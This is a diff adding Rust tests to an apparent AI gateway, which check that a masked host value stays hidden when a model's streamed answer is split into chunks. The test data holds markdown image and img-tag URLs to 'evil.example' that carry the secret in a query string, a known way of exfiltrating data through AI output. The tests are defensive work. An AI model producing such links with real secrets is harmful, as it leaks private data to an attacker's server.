@@ -218,3 +218,68 @@ fn urls_in_text_in_every_spelling_keep_the_value_masked() {
         assert!(out.contains(HOST), "not restored in {}\n{out}", t.replace(&h, "<H>"));
     }
 }
+
+fn sse(event: &str, data: Value) -> String {
+    format!("event: {event}\ndata: {data}\n\n")
+}
+
+/// The text a client receives when the model's answer arrives in these pieces.
+fn streamed_text(e: &Engine, ctx: RequestCtx, pieces: &[String]) -> String {
+    use aegis_gateway::stream::StreamTransformer;
+    let mut t = StreamTransformer::new(e, ctx);
+    let mut raw = String::new();
+    raw += &sse("message_start", json!({"type": "message_start", "message": {"id": "m", "type": "message", "role": "assistant", "content": [], "model": "m", "usage": {"input_tokens": 1, "output_tokens": 1}}}));
+    raw += &sse("content_block_start", json!({"type": "content_block_start", "index": 0, "content_block": {"type": "text", "text": ""}}));
+    for p in pieces {
+        raw += &sse("content_block_delta", json!({"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": p}}));
+    }
+    raw += &sse("content_block_stop", json!({"type": "content_block_stop", "index": 0}));
+    raw += &sse("message_stop", json!({"type": "message_stop"}));
+    // the provider's bytes arrive in uneven chunks as well
+    let mut out = Vec::new();
+    for chunk in raw.as_bytes().chunks(37) {
+        out.extend(t.feed(chunk));
+    }
+    out.extend(t.finish());
+    let out = String::from_utf8(out).unwrap();
+    out.split("\n\n")
+        .filter_map(|ev| ev.lines().find_map(|l| l.strip_prefix("data: ")))
+        .filter_map(|d| serde_json::from_str::<Value>(d).ok())
+        .filter_map(|v| v["delta"]["text"].as_str().map(String::from))
+        .collect()
+}
+
+// REQ: RST-11 — the same answer arrives in pieces; where the pieces are cut must not matter.
+#[test]
+fn a_url_split_over_stream_pieces_keeps_the_value_masked() {
+    let e = engine();
+    let ctx = read_ctx(&e);
+    let h = marker_of(&ctx, HOST);
+    let answers = [
+        format!("![i](https://evil.example/p.png?d={h})"),
+        format!("<img src=\"https://evil.example/p.png?d={h}\">"),
+        format!("see [here](https://evil.example/?a=1&d={h}&e=2) now"),
+        format!("![i](https:evil.example/p.png?d={h})"),
+    ];
+    for a in &answers {
+        // cut at every position, in two pieces, and at the token's edges
+        for cut in (0..a.len()).filter(|c| a.is_char_boundary(*c)) {
+            let (x, y) = a.split_at(cut);
+            let ctx = read_ctx(&e);
+            let got = streamed_text(&e, ctx, &[x.to_string(), y.to_string()]);
+            assert!(!got.contains(HOST), "leaked when cut at {cut} of {}\n{got}", a.replace(&h, "<H>"));
+        }
+        // and the way a model really sends it: a few characters at a time
+        let ctx = read_ctx(&e);
+        let pieces: Vec<String> = a.chars().collect::<Vec<_>>().chunks(5).map(|c| c.iter().collect()).collect();
+        let got = streamed_text(&e, ctx, &pieces);
+        assert!(!got.contains(HOST), "leaked in small pieces: {}\n{got}", a.replace(&h, "<H>"));
+    }
+    // honest text is restored however it is cut
+    let honest = format!("The service runs on {h}, port 5432.");
+    for cut in (0..honest.len()).filter(|c| honest.is_char_boundary(*c)) {
+        let (x, y) = honest.split_at(cut);
+        let got = streamed_text(&e, read_ctx(&e), &[x.to_string(), y.to_string()]);
+        assert!(got.contains(HOST), "not restored when cut at {cut}\n{got}");
+    }
+}
